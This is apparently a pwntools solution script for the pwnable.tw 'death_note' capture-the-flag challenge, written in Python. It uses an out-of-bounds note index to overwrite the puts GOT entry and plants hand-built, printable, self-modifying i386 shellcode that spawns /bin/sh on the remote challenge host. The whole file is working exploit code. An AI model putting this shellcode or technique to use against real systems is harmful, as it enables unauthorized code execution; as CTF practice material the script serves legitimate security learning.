from pwn import *

p = remote('chall.pwnable.tw', 10201)

context.update(arch='i386')
elf = ELF('./death_note')

# p = process('./death_note', env={"LD_PRELOAD":"libc-2.23.so"})
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                     b *0x80487ef
#                                     continue
#                                     ''')
puts_got = elf.got['puts']
printf_got = elf.got['printf']

free_got = elf.got['free']
note_addr = 0x0804A060

def add_note(index, name):
    p.sendlineafter(" :", '1')
    p.sendlineafter(" :", str(index))
    p.sendafter(" :", name)

def show_name(index):
    p.sendlineafter(" :", '2')
    p.sendlineafter(" :", str(index))

def del_note(index):
    p.sendlineafter(" :", '3')
    p.sendlineafter(" :", str(index))

shellcode = '''
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl

    push ecx
    pop edx

    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    

    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + '\x6b\x40'

## Status before calling shellcode
# eax = 0xfffffff0
# ebx = 0
# ecx = 0
# edx = addr of shellcode

## Goal
# eax = 0xb
# ebx = "/bin/sh" addr
# ecx = 0
# edx = 0
# int 0x80 
### int 0x80 = "\xcd\x80", \xcd is opcode of int ###

def solve():
    offset = (puts_got - note_addr)//4
    add_note(offset, shellcode)
    # p.sendline("cat /home/death_note/flag")
    p.interactive()
if __name__ == '__main__':
    solve()